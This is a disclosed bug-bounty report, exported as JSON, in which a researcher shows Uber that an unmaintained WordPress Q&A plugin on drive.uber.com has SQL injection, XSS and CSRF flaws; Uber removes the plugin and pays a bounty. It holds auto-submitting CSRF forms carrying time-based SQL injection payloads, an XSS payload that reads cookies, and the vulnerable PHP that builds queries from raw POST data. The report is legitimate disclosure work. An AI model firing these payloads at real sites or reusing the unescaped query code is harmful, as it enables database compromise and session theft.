{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-08-17T23:03:37.319Z", 
    "voters": [
        "sameoldstory", 
        "michiel", 
        "rijalrojan", 
        "xpathmaster", 
        "spam404", 
        "parth", 
        "ta8ahi", 
        "bogdantcaciuc", 
        "supernatural", 
        "xsam", 
        "and 37 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "5000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 135288, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-08-23T20:13:36.443Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Multiple vulnerabilities in a WordPress plugin at drive.uber.com", 
    "is_member_of_team?": null, 
    "vote_count": 47, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-09-16T23:03:37.449Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$5,000", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-05-02T21:22:35.302Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-02T21:22:35.302Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Thanks for the very well written report @syndr0me I've triaged this internally and we get this fixed as soon as possible!", 
            "markdown_message": "<p>Thanks for the very well written report <a href=\"/syndr0me\">@syndr0me</a> I&#39;ve triaged this internally and we get this fixed as soon as possible!</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 937412, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-12T19:59:20.834Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-12T19:59:20.834Z", 
            "actor": {
                "username": "0xsyndr0me", 
                "url": "/0xsyndr0me", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/377/8695ac9c92831a0d8e73d0203f6098746df44d88_medium.jpg?1442685020"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Thanks @mandatoryuber for your words. \nWhat are you going to do next? Fix it or remove it and find an alternative? ", 
            "markdown_message": "<p>Thanks <a href=\"/mandatoryuber\">@mandatoryuber</a> for your words. <br>\nWhat are you going to do next? Fix it or remove it and find an alternative? </p>\n", 
            "type": "Activities::Comment", 
            "id": 954201, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "0xsyndr0me", 
                "url": "/0xsyndr0me"
            }, 
            "created_at": "2016-06-15T20:48:58.680Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-15T20:48:58.680Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "From our developers:\n\"Plugin disabled and deleted. Upgraded site and all plugins.\"", 
            "markdown_message": "<p>From our developers:<br>\n&quot;Plugin disabled and deleted. Upgraded site and all plugins.&quot;</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1015958, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-06-28T16:12:43.676Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-28T16:12:43.676Z", 
            "actor": {
                "url": "/uber", 
                "profile": {
                    "name": "Uber"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
                }
            }, 
            "team_handle": "uber", 
            "bounty_amount": "5000.0", 
            "collaborator": {
                "username": "0xsyndr0me", 
                "url": "/0xsyndr0me"
            }, 
            "message": "Thanks for the great find!", 
            "markdown_message": "<p>Thanks for the great find!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1043366, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-06T06:16:17.327Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-06T06:16:17.327Z", 
            "actor": {
                "username": "0xsyndr0me", 
                "url": "/0xsyndr0me", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/377/8695ac9c92831a0d8e73d0203f6098746df44d88_medium.jpg?1442685020"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Thanks for the bounty ^_^", 
            "markdown_message": "<p>Thanks for the bounty ^_^</p>\n", 
            "type": "Activities::Comment", 
            "id": 1055010, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-17T23:03:37.364Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-17T23:03:37.364Z", 
            "actor": {
                "username": "0xsyndr0me", 
                "url": "/0xsyndr0me", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/377/8695ac9c92831a0d8e73d0203f6098746df44d88_medium.jpg?1442685020"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "first_to_agree": true, 
            "message": "Can we publicly disclose this one? ;)", 
            "markdown_message": "<p>Can we publicly disclose this one? ;)</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1133217, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-23T20:13:36.483Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-23T20:13:36.483Z", 
            "actor": {
                "username": "lyoung-uber", 
                "url": "/lyoung-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/873/a15c66b0ad7834ebe7cd48006c61b58bfe42514e_medium.jpg?1466112878"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Sure thing @syndr0me!", 
            "markdown_message": "<p>Sure thing <a href=\"/syndr0me\">@syndr0me</a>!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1150102, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-23T20:13:36.600Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-23T20:13:36.600Z", 
            "actor": {
                "username": "lyoung-uber", 
                "url": "/lyoung-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/873/a15c66b0ad7834ebe7cd48006c61b58bfe42514e_medium.jpg?1466112878"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1150103, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "0xsyndr0me", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/0xsyndr0me", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/040/377/aea1680d1fc7b80b36881e36924f6ab7702ba269_small.jpg?1442685020"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 67, 
        "name": "SQL Injection"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -70069588.47786705, 
    "disclosed_at": "2016-08-23T20:13:36.554Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/135288", 
    "created_at": "2016-04-29T02:57:55.343Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi again,</p>\n\n<p>The story begins when I started looking at <a title=\"https://drive.uber.com/ukmarketplace/welcome/\" href=\"/redirect?signature=b6047adcd78e567ab628b61d7758a2e9083540af&amp;url=https%3A%2F%2Fdrive.uber.com%2Fukmarketplace%2Fwelcome%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://drive.uber.com/ukmarketplace/welcome/</span><i class=\"icon-external-link\"></i></a>, at the first glance I noticed that you are running WordPress 4.4.2 (which you probably know is outdated now <a href=\"/redirect?signature=9dc2828874e603a84a95d356d5e2d60d30b9ffc3&amp;url=https%3A%2F%2Fcodex.wordpress.org%2FVersion_4.5%23Security\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>[1]</span><i class=\"icon-external-link\"></i></a> ). So first you need to update to the latest version to patch the publicly known vulnerabilities.</p>\n\n<p>When I looked at the plugins, all of them were up-to-date. However, when I looked up WordPress plugins for <strong>q-and-a</strong> plugin, I could not find it. It was removed from WordPress. So I googled any known vulnerabilities in the plugin and I found that it&#39;s vulnerable to Full Path Disclosure but the technical details of the vulnerability went down when OSVDB decided to go down <a href=\"/redirect?signature=9c8786204961142884a5f2fb9b87ab70459bf2f8&amp;url=https%3A%2F%2Fwpvulndb.com%2Fvulnerabilities%2F7049\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>[2]</span><i class=\"icon-external-link\"></i></a>. </p>\n\n<p>Communicated developers but said it&#39;s no longer supported, and contacting you without a solid bug in hand would be useless, So I decided to download the latest known version from WordPress Plugin Repository <a href=\"/redirect?signature=474f32ccdef0d20bc01ef81552ee117db63222b5&amp;url=http%3A%2F%2Fplugins.svn.wordpress.org%2Fq-and-a%2Ftrunk%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>[3]</span><i class=\"icon-external-link\"></i></a> -Which is the one you are running (1.0.6.2)- and try my luck. </p>\n\n<h2 id=\"background\">Background</h2>\n\n<p>The attack requires a logged-in administrator of the blog to visit an attacker-controlled website. </p>\n\n<h2 id=\"vulnerabilities\">Vulnerabilities</h2>\n\n<h3 id=\"sql-injection-s\">SQL INJECTION(s)</h3>\n\n<p>I discovered that one endpoint is vulnerable to 2 SQL injection vulnerabilities due to non-escaping of certain parameters</p>\n\n<h4 id=\"1st-vulnerability\">1st Vulnerability</h4>\n\n<p><strong>Steps to reproduce</strong></p>\n\n<ol>\n<li>Create a page with the following code</li>\n</ol>\n<pre class=\"highlight plaintext\"><code>&lt;form action=&quot;https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&amp;page=faqpageorder&quot; target=&quot;_blank&quot;  method=&quot;post&quot; style=&quot;display: none;&quot;&gt;\n            &lt;input type=&quot;text&quot; name=&quot;btnOrderPages&quot; value=&quot;Click to Reorder FAQs&quot; /&gt;\n            &lt;input type=&quot;text&quot; name=&quot;hdnfaqpageorder&quot; value=&quot;id_8,id_7&quot; /&gt;\n            &lt;input type=&quot;text&quot; name=&quot;hdnParentID&quot; value=&quot;IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)&quot; /&gt;\n            &lt;input type=&quot;text&quot; name=&quot;btnReturnParent&quot; value=&quot;1&quot; /&gt;\n            &lt;input type=&quot;submit&quot; name=&quot;send&quot; value=&quot;Save&quot; /&gt;\n&lt;/form&gt;\n&lt;script type=&quot;text/javascript&quot;&gt;\ndocument.forms[0].submit();\n&lt;/script&gt;\n</code></pre>\n<ol>\n<li>Visit the page with a logged-in administrator account</li>\n</ol>\n\n<p>The payload used, confirms that the current database version is 5.x.x by sleeping 5 seconds</p>\n\n<p>Vulnerability exists due to POST data not being escaped before injecting into query at <code>plugins/q-and-a/inc/reorder.php</code></p>\n<pre class=\"highlight plaintext\"><code>45. if (isset($_POST[&#39;btnReturnParent&#39;])) { \n46.     $parentsParent = $wpdb-&gt;get_row(&quot;SELECT post_parent FROM $wpdb-&gt;posts WHERE ID = &quot; . $_POST[&#39;hdnParentID&#39;], ARRAY_N);\n47.     $parentID = $parentsParent[0];\n48. }\n</code></pre>\n<h4 id=\"2nd-vulnerability\">2nd Vulnerability</h4>\n\n<p><strong>Steps to reproduce</strong></p>\n\n<ol>\n<li>Create a page with the following code</li>\n</ol>\n<pre class=\"highlight plaintext\"><code>&lt;form action=&quot;https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&amp;page=faqpageorder&quot; target=&quot;_blank&quot;  method=&quot;post&quot; style=&quot;display: none;&quot;&gt;\n            &lt;input type=&quot;text&quot; name=&quot;btnOrderPages&quot; value=&quot;Click to Reorder FAQs&quot; /&gt;\n            &lt;input type=&quot;text&quot; name=&quot;hdnfaqpageorder&quot; value=&quot;id_8,id_7&quot; /&gt;\n            &lt;input type=&quot;text&quot; name=&quot;hdnParentID&quot; value=&quot;&quot; /&gt;\n            &lt;input type=&quot;text&quot; name=&quot;pages&quot; value=&quot;IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)&quot; /&gt;\n            &lt;input type=&quot;text&quot; name=&quot;btnSubPages&quot; value=&quot;1&quot; /&gt;\n            &lt;input type=&quot;submit&quot; name=&quot;send&quot; value=&quot;Save&quot; /&gt;\n&lt;/form&gt;\n&lt;script type=&quot;text/javascript&quot;&gt;\ndocument.forms[0].submit();\n&lt;/script&gt;\n</code></pre>\n<ol>\n<li>Visit the page with a logged-in administrator account</li>\n</ol>\n\n<p>The payload used, confirms that the current database version is 5.x.x by sleeping 5 seconds</p>\n\n<p>Vulnerability exists due to POST data not being escaped before injecting into query at <code>plugins/q-and-a/inc/reorder.php</code></p>\n<pre class=\"highlight plaintext\"><code>38. if (isset($_POST[&#39;btnSubPages&#39;])) { \n39.     $parentID = $_POST[&#39;pages&#39;];\n40. }\n41. elseif (isset($_POST[&#39;hdnParentID&#39;])) { \n42.     $parentID = $_POST[&#39;hdnParentID&#39;];\n43. }\n</code></pre><pre class=\"highlight plaintext\"><code>253. function faqpageorder_pageQuery($parentID)\n254. {\n255.    global $wpdb;\n256.    return $wpdb-&gt;get_results(&quot;SELECT * FROM $wpdb-&gt;posts WHERE post_parent = $parentID and post_type = &#39;qa_faqs&#39; AND post_status != &#39;trash&#39; AND post_status != &#39;auto-draft&#39; ORDER BY menu_order ASC&quot;);\n257. }\n</code></pre>\n<h3 id=\"cross-site-scripting-xss\">Cross-Site Scripting (XSS)</h3>\n\n<p>This turned out to be false positive or to be more accurate not possible to exploit remotely because the page is protected by CSRF nonce which is hard to obtain so remote attack vector will eventually fail. but since it is stored XSS, a malicious administrator can use it to inject javascript code into adminpanel.</p>\n\n<p><strong>Steps to reproduce</strong></p>\n\n<ol>\n<li>Log into admin panel</li>\n<li>Go to Settings -&gt; Q &amp; A</li>\n<li>Change FAQ homepage into your payload (<code>&#39;&quot;/autofocus/onfocus=alert(document.domain%2bdocument.cookie);//</code>)</li>\n<li>Save Settings</li>\n</ol>\n\n<h3 id=\"cross-site-request-forgery-csrf\">Cross-Site Request Forgery (CSRF)</h3>\n\n<p>As it has been clear from previous requests that FAQs reordering is vulnerable to CSRF which does not really pose a serious threat to the website.<br>\n<strong>Vulnerable Endpoint:</strong> <a title=\"http://localhost/wp/wp-admin/edit.php?post_type=qa_faqs&amp;page=faqpageorder\" href=\"/redirect?signature=c8f163f37de7b30a1740314f079182bca40abb85&amp;url=http%3A%2F%2Flocalhost%2Fwp%2Fwp-admin%2Fedit.php%3Fpost_type%3Dqa_faqs%26page%3Dfaqpageorder\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://localhost/wp/wp-admin/edit.php?post_type=qa_faqs&amp;page=faqpageorder</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"final-note\">Final Note</h2>\n\n<p>Of course these are not all the bugs that exist in the plugin, I just made a quick test to prove that the plugin is vulnerable to serious threats. Do you really believe it is worth it to keep a no longer supported plugin? It&#39;s your call of course. However, when I communicated the developers of the plugin at madebyraygun.com for their assistance, this was their reply</p>\n\n<blockquote>\n<p>Sorry Abood, we have not developed or maintained that plugin for many years and do not have access to the source code or repository. The developer who was working on it more recently has pulled it from the WP repository, I believe. If you are responsible for a site that uses the plugin, <strong>I would recommend removing it and using something that is more up to date</strong>. </p>\n</blockquote>\n\n<p>Thank you for your time!</p>\n\n<p><strong>References:</strong><br>\n[1] <a title=\"https://codex.wordpress.org/Version_4.5#Security\" href=\"/redirect?signature=9dc2828874e603a84a95d356d5e2d60d30b9ffc3&amp;url=https%3A%2F%2Fcodex.wordpress.org%2FVersion_4.5%23Security\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://codex.wordpress.org/Version_4.5#Security</span><i class=\"icon-external-link\"></i></a><br>\n[2] <a title=\"https://wpvulndb.com/vulnerabilities/7049\" href=\"/redirect?signature=9c8786204961142884a5f2fb9b87ab70459bf2f8&amp;url=https%3A%2F%2Fwpvulndb.com%2Fvulnerabilities%2F7049\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://wpvulndb.com/vulnerabilities/7049</span><i class=\"icon-external-link\"></i></a><br>\n[3] <a title=\"http://plugins.svn.wordpress.org/q-and-a/trunk/\" href=\"/redirect?signature=474f32ccdef0d20bc01ef81552ee117db63222b5&amp;url=http%3A%2F%2Fplugins.svn.wordpress.org%2Fq-and-a%2Ftrunk%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://plugins.svn.wordpress.org/q-and-a/trunk/</span><i class=\"icon-external-link\"></i></a></p>\n", 
    "vulnerability_information": "Hi again,\n\nThe story begins when I started looking at https://drive.uber.com/ukmarketplace/welcome/, at the first glance I noticed that you are running WordPress 4.4.2 (which you probably know is outdated now [[1]](https://codex.wordpress.org/Version_4.5#Security) ). So first you need to update to the latest version to patch the publicly known vulnerabilities.\n\nWhen I looked at the plugins, all of them were up-to-date. However, when I looked up WordPress plugins for **q-and-a** plugin, I could not find it. It was removed from WordPress. So I googled any known vulnerabilities in the plugin and I found that it's vulnerable to Full Path Disclosure but the technical details of the vulnerability went down when OSVDB decided to go down [[2]](https://wpvulndb.com/vulnerabilities/7049). \n\nCommunicated developers but said it's no longer supported, and contacting you without a solid bug in hand would be useless, So I decided to download the latest known version from WordPress Plugin Repository [[3]] (http://plugins.svn.wordpress.org/q-and-a/trunk/) -Which is the one you are running (1.0.6.2)- and try my luck. \n\n## Background  \nThe attack requires a logged-in administrator of the blog to visit an attacker-controlled website. \n\n## Vulnerabilities\n\n### SQL INJECTION(s)\nI discovered that one endpoint is vulnerable to 2 SQL injection vulnerabilities due to non-escaping of certain parameters\n\n#### 1st Vulnerability\n\n**Steps to reproduce**\n1. Create a page with the following code\n\n```\n<form action=\"https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder\" target=\"_blank\"  method=\"post\" style=\"display: none;\">\n            <input type=\"text\" name=\"btnOrderPages\" value=\"Click to Reorder FAQs\" />\n            <input type=\"text\" name=\"hdnfaqpageorder\" value=\"id_8,id_7\" />\n            <input type=\"text\" name=\"hdnParentID\" value=\"IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)\" />\n            <input type=\"text\" name=\"btnReturnParent\" value=\"1\" />\n            <input type=\"submit\" name=\"send\" value=\"Save\" />\n</form>\n<script type=\"text/javascript\">\ndocument.forms[0].submit();\n</script>\n```\n2. Visit the page with a logged-in administrator account\n\nThe payload used, confirms that the current database version is 5.x.x by sleeping 5 seconds\n\nVulnerability exists due to POST data not being escaped before injecting into query at `plugins/q-and-a/inc/reorder.php`\n\n```\n45. if (isset($_POST['btnReturnParent'])) { \n46. \t$parentsParent = $wpdb->get_row(\"SELECT post_parent FROM $wpdb->posts WHERE ID = \" . $_POST['hdnParentID'], ARRAY_N);\n47. \t$parentID = $parentsParent[0];\n48. }\n```\n\n\n#### 2nd Vulnerability\n**Steps to reproduce**\n1. Create a page with the following code\n\n```\n<form action=\"https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder\" target=\"_blank\"  method=\"post\" style=\"display: none;\">\n            <input type=\"text\" name=\"btnOrderPages\" value=\"Click to Reorder FAQs\" />\n            <input type=\"text\" name=\"hdnfaqpageorder\" value=\"id_8,id_7\" />\n            <input type=\"text\" name=\"hdnParentID\" value=\"\" />\n            <input type=\"text\" name=\"pages\" value=\"IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)\" />\n            <input type=\"text\" name=\"btnSubPages\" value=\"1\" />\n            <input type=\"submit\" name=\"send\" value=\"Save\" />\n</form>\n<script type=\"text/javascript\">\ndocument.forms[0].submit();\n</script>\n```\n2. Visit the page with a logged-in administrator account\n\nThe payload used, confirms that the current database version is 5.x.x by sleeping 5 seconds\n\nVulnerability exists due to POST data not being escaped before injecting into query at `plugins/q-and-a/inc/reorder.php`\n\n```\n38. if (isset($_POST['btnSubPages'])) { \n39. \t$parentID = $_POST['pages'];\n40. }\n41. elseif (isset($_POST['hdnParentID'])) { \n42. \t$parentID = $_POST['hdnParentID'];\n43. }\n```\n\n```\n253. function faqpageorder_pageQuery($parentID)\n254. {\n255. \tglobal $wpdb;\n256.\treturn $wpdb->get_results(\"SELECT * FROM $wpdb->posts WHERE post_parent = $parentID and post_type = 'qa_faqs' AND post_status != 'trash' AND post_status != 'auto-draft' ORDER BY menu_order ASC\");\n257. }\n```\n\n\n### Cross-Site Scripting (XSS)\nThis turned out to be false positive or to be more accurate not possible to exploit remotely because the page is protected by CSRF nonce which is hard to obtain so remote attack vector will eventually fail. but since it is stored XSS, a malicious administrator can use it to inject javascript code into adminpanel.\n\n**Steps to reproduce**\n1. Log into admin panel\n2. Go to Settings -> Q & A\n3. Change FAQ homepage into your payload (`'\"/autofocus/onfocus=alert(document.domain%2bdocument.cookie);//`)\n4. Save Settings\n\n\n### Cross-Site Request Forgery (CSRF)\nAs it has been clear from previous requests that FAQs reordering is vulnerable to CSRF which does not really pose a serious threat to the website.\n**Vulnerable Endpoint:** http://localhost/wp/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder\n\n## Final Note\nOf course these are not all the bugs that exist in the plugin, I just made a quick test to prove that the plugin is vulnerable to serious threats. Do you really believe it is worth it to keep a no longer supported plugin? It's your call of course. However, when I communicated the developers of the plugin at madebyraygun.com for their assistance, this was their reply\n\n>Sorry Abood, we have not developed or maintained that plugin for many years and do not have access to the source code or repository. The developer who was working on it more recently has pulled it from the WP repository, I believe. If you are responsible for a site that uses the plugin, **I would recommend removing it and using something that is more up to date**. \n\nThank you for your time!\n\n**References:**\n[1] https://codex.wordpress.org/Version_4.5#Security\n[2] https://wpvulndb.com/vulnerabilities/7049\n[3] http://plugins.svn.wordpress.org/q-and-a/trunk/", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.uber.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Uber"
        }, 
        "handle": "uber", 
        "url": "https://hackerone.com/uber", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/314/826c90cba1555458df787ae914793cd5070e18df_small.png?1514905146", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}